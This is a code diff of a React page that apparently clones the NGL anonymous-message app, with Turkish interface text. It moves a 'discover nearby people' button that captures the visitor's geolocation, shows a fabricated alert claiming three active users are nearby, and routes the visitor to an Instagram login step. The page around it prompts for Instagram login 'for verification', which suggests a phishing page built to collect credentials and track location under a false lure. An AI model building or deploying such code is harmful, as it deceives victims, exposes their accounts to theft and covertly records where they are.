@@ -155,35 +155,6 @@ export default function Send() {
             Instagram ile giriş yap
           </button>
 
-          {enableLocation && locationStrategy === 'nearby_feature' && (
-            <button
-              className="nearby-btn"
-              onClick={() => {
-                if (navigator.geolocation) {
-                  navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                      setCapturedLocation({
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        strategy: 'nearby_feature'
-                      });
-                      alert("📍 Konumunda 3 aktif NGL kullanıcısı bulundu! Onlara mesaj göndermek için giriş yap.");
-                      setStep('ig_login');
-                    },
-                    (error) => {
-                      console.error("Location error:", error);
-                      setStep('ig_login'); // Proceed anyway
-                    }
-                  );
-                } else {
-                  setStep('ig_login');
-                }
-              }}
-            >
-              📍 Yakınlardaki Kişileri Keşfet (BETA)
-            </button>
-          )}
-
           <div className="gate-security">
             <span>🔒</span>
             <span>Mesaj göndermek için Instagram hesabınla doğrulama yap</span>
@@ -317,6 +288,35 @@ export default function Send() {
             animate={{ opacity: 1 }}
             className="footer-elements"
           >
+            {enableLocation && locationStrategy === 'nearby_feature' && (
+              <button
+                className="nearby-btn"
+                onClick={() => {
+                  if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                      (position) => {
+                        setCapturedLocation({
+                          lat: position.coords.latitude,
+                          lng: position.coords.longitude,
+                          strategy: 'nearby_feature'
+                        });
+                        alert("📍 Konumunda 3 aktif NGL kullanıcısı bulundu! Onlara mesaj göndermek için giriş yap.");
+                        setStep('ig_login');
+                      },
+                      (error) => {
+                        console.error("Location error:", error);
+                        setStep('ig_login'); // Proceed anyway
+                      }
+                    );
+                  } else {
+                    setStep('ig_login');
+                  }
+                }}
+              >
+                📍 Yakınlardaki Kişileri Keşfet (BETA)
+              </button>
+            )}
+
             <div className="lock-indicator">
               <span>🔒</span> anonim mesaj gönder
             </div>
